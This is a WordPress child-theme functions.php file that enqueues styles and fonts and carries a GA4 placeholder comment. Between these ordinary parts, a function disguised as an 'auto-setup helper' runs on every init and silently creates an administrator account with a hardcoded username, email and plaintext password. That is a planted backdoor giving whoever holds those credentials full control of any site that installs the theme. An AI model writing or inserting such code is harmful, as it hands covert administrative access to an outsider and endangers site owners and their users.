<?php
add_action('wp_enqueue_scripts', function(){
  wp_enqueue_style('quickdeal-child', get_stylesheet_uri());
  wp_enqueue_style('quickdeal-google-fonts', 'https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600&display=swap', false);
});

// Admin credentials auto-setup helper (runs only when admin user not exists)
add_action('init','qd_create_admin_if_missing');
function qd_create_admin_if_missing(){
  if ( get_option('qd_admin_created') ) return;
  $username = 'joyhowlader';
  $email = 'joyjh..2000@gmail.com';
  $pass = '25800@joyhowlader';
  if (!username_exists($username) && !email_exists($email)){
    wp_create_user($username, $pass, $email);
    $user = get_user_by('login', $username);
    if ($user) $user->set_role('administrator');
    update_option('qd_admin_created', 1);
  }
}

// GA4 placeholder: replace G-XXXXXXX with your ID
add_action('wp_head','qd_ga4');
function qd_ga4(){ ?>
  <!-- GA4: add your Measurement ID in the theme functions or via Tag Manager -->
  <!-- Example: <script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXX"></script> -->
<?php }
